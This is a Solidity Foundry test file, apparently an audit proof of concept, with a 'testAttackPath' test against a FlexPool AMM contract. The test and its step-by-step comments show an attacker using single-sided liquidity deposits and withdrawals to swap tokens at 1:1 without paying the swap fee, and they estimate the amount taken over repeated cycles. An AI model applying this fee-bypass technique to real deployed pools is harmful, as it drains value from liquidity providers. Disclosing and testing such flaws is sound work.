// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import {FlexPool} from "src/DexAndAMMLogic/FlexPool.sol";
import {Base} from "test/Base.t.sol";
import {Token} from "test/mocks/Token.sol";
import {console2} from "forge-std/console2.sol";

contract FlexPoolTest is Base {
    FlexPool pool;
    Token a;
    Token b;

    address _user = address(0x233);

    function setUp() external {
        a = new Token("A", "a");
        b = new Token("B", "b");

        pool = new FlexPool(address(a), address(b));
        _initPool();
    }

    function _mintAndApprove(address account, uint256 amount) internal {
        a.mint(account, amount);
        b.mint(account, amount);

        vm.startPrank(account);
        a.approve(address(pool), type(uint112).max);
        b.approve(address(pool), type(uint112).max);
        vm.stopPrank();
    }

    function _initPool() internal {
        uint256 amount = 10_000e18;
        _mintAndApprove(_user, amount);
        vm.prank(_user);
        pool.initPool(amount, amount);
    }

    function testAttackPath() external {
        // 1. Pool: reserveA=10,000, reserveB=10,000, totalLP=20,000. Fee=0.3% but not applied on single-sided deposits
        uint256 totalLp = pool.getPoolValue();
        uint256 amount = 10_000e18;
        assertEq(totalLp, (amount * 2));

        // 2. Attacker deposits 10,000 tokenA single-sided. totalValue=20,000. lp = 10,000 * 20,000 / 20,000 = 10,000. New state: reserveA=20,000, reserveB=10,000, totalLP=30,000
        address attacker = address(0x299);
        _mintAndApprove(attacker, amount);

        vm.prank(attacker);
        pool.addLiquiditySingleSided(address(a), amount);
        assertEq(pool.getPoolValue(), 30_000e18);
        // 3. Attacker holds 10,000 / 30,000 = 33.3% of pool

        // 4. Attacker removes 10,000 LP: outA = 10,000 * 20,000 / 30,000 = 6,666. outB = 10,000 * 10,000 / 30,000 = 3,333
        vm.prank(attacker);
        pool.removeLiquidity(amount);

        uint256 aOut = a.balanceOf(attacker);
        uint256 bOut = b.balanceOf(attacker) - amount;

        console2.log("A Amount out: ", aOut);
        console2.log("B Amount out: ", bOut);

        // 5. Net: deposited 10,000 tokenA, received 6,666 tokenA + 3,333 tokenB. Effectively swapped 3,334 tokenA for 3,333 tokenB at 1:1 with zero fee
        assertLe(aOut + bOut, amount);

        // 6. If the swap fee is 0.3%, each cycle steals 0.3% * 3,334 = ~10 tokens from the pool. Repeated 100 times = ~1,000 tokens extracted.
    }
}
